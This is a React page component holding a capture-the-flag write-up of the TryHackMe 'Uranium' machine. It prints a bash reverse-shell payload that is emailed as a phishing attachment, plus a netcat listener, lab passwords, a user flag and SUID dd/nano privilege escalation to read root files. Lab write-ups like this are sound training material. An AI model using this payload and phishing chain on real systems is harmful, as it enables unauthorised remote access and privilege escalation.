import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const THM_URANIUM = () => {

    const port_scan = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ nmap -sC -sV 10.10.23.23 -oN nmap 
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 08:17 EDT
    Nmap scan report for 10.10.23.23
    Host is up (0.21s latency).
    Not shown: 997 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 (RSA)
    |   256 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 (ECDSA)
    |_  256 c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e (ED25519)
    25/tcp open  smtp    Postfix smtpd
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=uranium
    | Subject Alternative Name: DNS:uranium
    | Not valid before: 2021-04-09T21:40:53
    |_Not valid after:  2031-04-07T21:40:53
    |_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Uranium Coin
    Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.87 seconds`
   
    const code = `
    <nav>
        <ul>
            <li><a href="#">Intro</a></li>
            <li><a href="#">Work</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Contact</a></li>
            <!--<li><a href="#elements">Elements</a></li>-->
        </ul>
    </nav>`

    const hosts = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ cat /etc/hosts
    127.0.0.1       localhost
    127.0.1.1       kali
    ::1             localhost ip6-localhost ip6-loopback
    ff02::1         ip6-allnodes
    ff02::2         ip6-allrouters
    10.10.23.23     uranium.thm`

    const payload = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ echo 'bash -c "bash -i >& /dev/tcp/10.13.30.137/4444 0>&1"' > application`

    const sendmail = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ sendEmail -h

    sendEmail-1.56 by Brandon Zehm <caspian@dotconf.net>

    Synopsis:  sendEmail -f ADDRESS [options]

    Required:
        -f ADDRESS                from (sender) email address
        * At least one recipient required via -t, -cc, or -bcc
        * Message body required via -m, STDIN, or -o message-file=FILE

    Common:
        -t ADDRESS [ADDR ...]     to email address(es)
        -u SUBJECT                message subject
        -m MESSAGE                message body
        -s SERVER[:PORT]          smtp mail relay, default is localhost:25
        -S [SENDMAIL_PATH]        use local sendmail utility (default: /usr/bin/sendmail) instead of network MTA

    Optional:
        -a   FILE [FILE ...]      file attachment(s)
        -cc  ADDRESS [ADDR ...]   cc  email address(es)
        -bcc ADDRESS [ADDR ...]   bcc email address(es)
        -xu  USERNAME             username for SMTP authentication
        -xp  PASSWORD             password for SMTP authentication

    Paranormal:
        -b BINDADDR[:PORT]        local host bind address
        -l LOGFILE                log to the specified file
        -v                        verbosity, use multiple times for greater effect
        -q                        be quiet (i.e. no STDOUT output)
        -o NAME=VALUE             advanced options, for details try: --help misc
            -o message-content-type=<auto|text|html>
            -o message-file=FILE         -o message-format=raw
            -o message-header=HEADER     -o message-charset=CHARSET
            -o reply-to=ADDRESS          -o timeout=SECONDS
            -o username=USERNAME         -o password=PASSWORD
            -o tls=<auto|yes|no>         -o fqdn=FQDN


    Help:
        --help                    the helpful overview you're reading now
        --help addressing         explain addressing and related options
        --help message            explain message body input and related options
        --help networking         explain -s, -b, etc
        --help output             explain logging and other output options
        --help misc               explain -o options, TLS, SMTP auth, and more`

    const command = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ sendEmail -f shelled@test.com -t hakanbey@uranium.thm -a ./application -m "Hi" -s 10.10.23.23 -o tls=no
    Aug 01 08:53:01 kali sendEmail[20977]: Email was sent successfully!`

    const shell = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ nc -lvnp 4444                    
    listening on [any] 4444 ...
    connect to [10.13.30.137] from (UNKNOWN) [10.10.23.23] 57590
    sh: 0: can't access tty; job control turned off
    $ `

    const stable = `
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ nc -lvnp 4444                    
    listening on [any] 4444 ...
    connect to [10.13.30.137] from (UNKNOWN) [10.10.23.23] 57590
    sh: 0: can't access tty; job control turned off
    $ ls
    chat_with_kral4
    mail_file
    user_1.txt
    $ which python
    $ which python3
    /usr/bin/python3
    $ python3 -c 'import pty;pty.spawn("/bin/bash")'
    hakanbey@uranium:~$ export TERM=xterm
    export TERM=xterm
    hakanbey@uranium:~$ ^Z
    zsh: suspended  nc -lvnp 4444
                                                                                                                                                                                                                                            
    ┌──(kali㉿kali)-[~/TryHackMe/Uranium]
    └─$ stty raw -echo;fg
    [1]  + continued  nc -lvnp 4444

    hakanbey@uranium:~$ `

    const chat = `
    hakanbey@uranium:~$ ./chat_with_kral4 
    PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
    kral4:hi hakanbey

    ->hi
    hakanbey:hi
    kral4:how are you?

    ->good you?
    hakanbey:good you?
    kral4:what now? did you forgot your password again

    ->sure^H^H^H^H
    hakanbey:sure
    ?

    ->yes
    hakanbey:yes
    kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
    kral4:i have to go
    kral4 disconnected

    connection terminated
    hakanbey@uranium:~$ `

    const sudo = `
    hakanbey@uranium:/var/www/html$ sudo -l
    [sudo] password for hakanbey: 
    Matching Defaults entries for hakanbey on uranium:
        env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User hakanbey may run the following commands on uranium:
        (kral4) /bin/bash
    You have mail in /var/mail/hakanbey`

    const user_2 = `
    kral4@uranium:/home/kral4$ ls
    chat_with_hakanbey  user_2.txt
    kral4@uranium:/home/kral4$ cat user_2.txt 
    thm{804d12e6d16189075db2d45449aeda5f}`

    const email = `
    kral4@uranium:/var/mail$ cat kral4 
    From root@uranium.thm  Sat Apr 24 13:22:02 2021
    Return-Path: <root@uranium.thm>
    X-Original-To: kral4@uranium.thm
    Delivered-To: kral4@uranium.thm
    Received: from uranium (localhost [127.0.0.1])
            by uranium (Postfix) with ESMTP id C7533401C2
            for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
    Message-ID: <841530.943147035-sendEmail@uranium>
    From: "root@uranium.thm" <root@uranium.thm>
    To: "kral4@uranium.thm" <kral4@uranium.thm>
    Subject: Hi Kral4
    Date: Sat, 24 Apr 2021 13:22:02 +0000
    X-Mailer: sendEmail-1.56
    MIME-Version: 1.0
    Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"
    
    This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
    
    ------MIME delimiter for sendEmail-992935.514616878
    Content-Type: text/plain;
            charset="iso-8859-1"
    Content-Transfer-Encoding: 7bit
    
    I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.
    
    ------MIME delimiter for sendEmail-992935.514616878--`

    const exploit = `
    kral4@uranium:/var/www/html$ echo "data" | /bin/dd of=index.html
    0+1 records in
    0+1 records out
    5 bytes copied, 0.000224913 s, 22.2 kB/s`

    const suid = `
    kral4@uranium:/home/kral4$ ls -la
    total 384
    drwxr-x--- 3 kral4 kral4   4096 Aug  1 14:20 .
    drwxr-xr-x 4 root  root    4096 Apr 23  2021 ..
    lrwxrwxrwx 1 root  root       9 Apr 25  2021 .bash_history -> /dev/null
    -rw-r--r-- 1 kral4 kral4    220 Apr  9  2021 .bash_logout
    -rw-r--r-- 1 kral4 kral4   3771 Apr  9  2021 .bashrc
    -rwxr-xr-x 1 kral4 kral4 109960 Apr  9  2021 chat_with_hakanbey
    -rw-r--r-- 1 kral4 kral4      5 Apr 23  2021 .check
    drwxrwxr-x 3 kral4 kral4   4096 Apr 10  2021 .local
    -rwsrwxrwx 1 root  root  245872 Aug  1 14:20 nano
    -rw-r--r-- 1 kral4 kral4    807 Apr  9  2021 .profile
    -rw-rw-r-- 1 kral4 kral4     38 Apr 10  2021 user_2.txt`

    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                        TryHackMe Uranium
                    </Typography>
                    <pre>2023/08/01 12:25PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Lab Description
                    </Typography>
                    <Typography>
                        Uranium is a "Hard" rated machine that has an interesting foothold which involves sending a reverse shell payload via an email over SMTP port 25. Once the foothold is obtained, a `.pcap` file can be found on the machine that will give us the password to an application which will then give us the password to the user's account. We then find that we can run bash as a different user and are able to write to files due to SUID bit being set on dd tool. Finally, we are able to achieve root.txt by figuring out through an email from the root user that we can get the SUID bit set on nano and then read root.txt.  
                    </Typography>

                    <Typography mt={4} variant="h5">
                    Lab Description
                    </Typography>
                    <Typography>
                    We have reached out a account one of the employees [hakanbey](https://twitter.com/hakanbe40520689)

                    In this room,you will learn about one of the phishing attack methods. I tried to design a phishing room (cronjobs and services) as much as I could.

                    Special Thanks to kral4 for helping us to make this room  

                    Note: Please do not attack the given twitter account.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {port_scan}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={6} variant="h5">
                        Port 80 Investigation
                    </Typography>
                    <Typography>
                    The webpage is just this single page, none of the buttons do anything.
                    </Typography>
                    <img src="/uranium_1.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Source Code Analysis
                    </Typography>
                    <Typography>
                    When looking through the source code I saw that there was more code that what was being displayed on the screen. I noticed that there is an additional button that is commented out, but the code for that button is still functional.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="html">
                        {code}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    When navigating to `http://10.10.23.23/#elements` there is more to see. However, this page just seems to be a list of markup being displayed.
                    </Typography>
                    <img src="/uranium_2.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography>
                    When navigating to `http://10.10.23.23/#elements` there is more to see. However, this page just seems to be a list of markup being displayed.
                    </Typography>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Twitter
                    </Typography>
                    <Typography>
                    I re-read the lab description and decided to click on the link to the user's twitter. There is reference to `uranium.thm`. This is probably a host I should add to my `/etc/hosts`. The account also says that everyone can send him an application file and he will open it. My first instinct is to send a file that will give us a reverse shell.
                    </Typography>
                    <img src="/uranium_3.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    /etc/hosts
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {hosts}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Port 80: uranium.thm
                    </Typography>
                    <Typography>
                    When navigating to `uranium.thm`, there is the same page. I wanted to make sure that there was no vhosting going on.
                    </Typography>
                    <img src="/uranium_1.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Phishing
                    </Typography>
                    <Typography>
                    We know that there is a user called `hakanbey` with an email of `hakanbey@uranium.thm`. With this information, lets craft a reverse shell payload that can be sent to him over SMTP. Note that the tweet said that the filename needs to be "application".
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                    Payload 
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {payload}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Sending the Email
                    </Typography>
                    <Typography>
                    We can either use a GUI such as `thunderbird` or a CLI application such as `sendEmail` to send the payload. I will do both just for learning sake.
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                    First things first, lets start our `netcat` listener on port 4444
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"nc -lvnp 4444"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    CLI: sendEmail
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {sendmail}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Command
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {command}
                    </SyntaxHighlighter>
                    <Typography>
                    Note that you may come across TLS issues, the solution to this is to use the `-o tls=no` flag.
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                    Reverse Shell
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {shell}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Stable Shell
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {stable}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Question 3: Solved
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"hakanbey@uranium:~$ ls\n"+
                         "chat_with_kral4  mail_file  user_1.txt"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    The chatapp seems to be password protected.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"hakanbey@uranium:~$ ./chat_with_kral4\n"+
                         "PASSWORD :"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Linpeas.sh
                    </Typography>
                    <Typography>
                    Some interesting findings from linpeas include
                    </Typography>
                    <Box pt={2} />
                    <Typography>
                    SUID Permission
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"-rwsr-x--- 1 web kral4 75K Apr 23  2021 /bin/dd "}
                    </SyntaxHighlighter>
                    <Box pt={2} />
                    <Typography>
                    CRON
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"ripmime -i /var/mail/hakanbey -d /home/hakanbey/mail_file/ ; find /home/hakanbey/mail_file/ -name \"application*\" -type f -exec chmod +x {} \; -exec {} \; ; > /var/mail/hakanbey ; rm /home/hakanbey/mail_file/* "}
                    </SyntaxHighlighter>
                    <Box pt={2} />
                    <Typography>
                    Outdated SUDO Version - didn't work
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"Sudo version 1.8.21p2  "}
                    </SyntaxHighlighter>
                    <Box pt={2} />
                    <Typography>
                    .bash_history - didn't work
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"/home/hakanbey/.bash_history"}
                    </SyntaxHighlighter>
                    <Box pt={2} />
                    <Typography>
                    Interesting Binary
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"Binary file /var/log/hakanbey_network_log.pcap matches"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Investigating the CRON Command
                    </Typography>
                    <Typography>
                    What is ripmime? 
                    </Typography>
                    <Typography>
                    - This tool extracted the reverse shell payload from the email.
                    </Typography>
                    <Box pt={2} />
                    <Typography>
                    Ripmime is a command-line utility used to extract attachments from MIME (Multipurpose Internet Mail Extensions) messages. MIME is a standard for encoding binary files, such as images or documents, into a text format, which allows these files to be sent as email attachments or embedded in other types of documents.
                    </Typography>
                    <Box pt={2} />
                    <Typography>
                    Ripmime is particularly useful when dealing with email messages in text format (e.g., stored in a mailbox or log file), where the attachments are encoded in MIME format. It can extract these attachments and save them as separate files on the local system, preserving their original file names and content.
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                    Usage
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"ripmime -i input_file -d output_directory"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Investigating the Log File
                    </Typography>
                    <img src="/uranium_4.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography>
                    If you right click on the first packet and click "Follow &gt; TCP Stream", you will get the following:
                    </Typography>
                    <img src="/uranium_5.png" style={{width: "100%", height: "100%"}}  />
                    <Box pt={5} />
                    <Typography>
                    This is the password to the chatapp.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"MBMD1vdpjg3kGv6SsIz56VNG"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Chat Program
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {chat}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Hakanbey's Password
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"Mys3cr3tp4sw0rD"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    With Hakanbey's password we can now do `sudo -l` to check his sudo priviledges.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {sudo}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    We are able to run bash as user kral4. This will give us access to his home directory.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {"hakanbey@uranium:/var/www/html$ sudo -u kral4 /bin/bash\n"+
                         "kral4@uranium:/var/www/html$"}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    User_2 Flag
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {user_2}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    I ran linpeas.sh again as kral4 user and saw that there was a file in `/var/mail/kral4`. This is the content of the email.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {email}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    I'm not sure what file this email is referring to because there is no nano file in the home directory. I can also not read/write to `/var/www/html`. After reading a writeup I saw that I had to copy `/bin/nano` to `/home/kral4` and then use the `dd` SUID exploit from earlier to edit `index.html` which would give `/bin/nano` SUID bit. I didn't think about that...
                    </Typography>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    SUID dd
                    </Typography>
                    <Typography>
                    If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (&lt;= Stretch) that allow the default `sh` shell to run with SUID privileges.
                    </Typography>
                    <Typography>
                    This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'LFILE=file_to_write\n'+
                         'echo "data" | ./dd of=$LFILE'}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    Exploit
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {exploit}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    Now I have SUID bit set on nano
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {suid}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography mt={4} variant="h5">
                    SUID nano
                    </Typography>
                    <Box pt={5} />
                    <Typography>
                    Since we have SUID on nano we can read the web_flag.txt
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'kral4@uranium:/var/www/html$ /home/kral4/nano web_flag.txt '}
                    </SyntaxHighlighter>
                    <Box pt={5} />
                    <Typography>
                    We can also read root.txt
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="bash">
                        {'kral4@uranium:/var/www/html$ /home/kral4/nano /root/root.txt'}
                    </SyntaxHighlighter>
                    <Box pt={25}/>
                </Typography>

            </Container>
        </Box>
    );
};

export default THM_URANIUM;
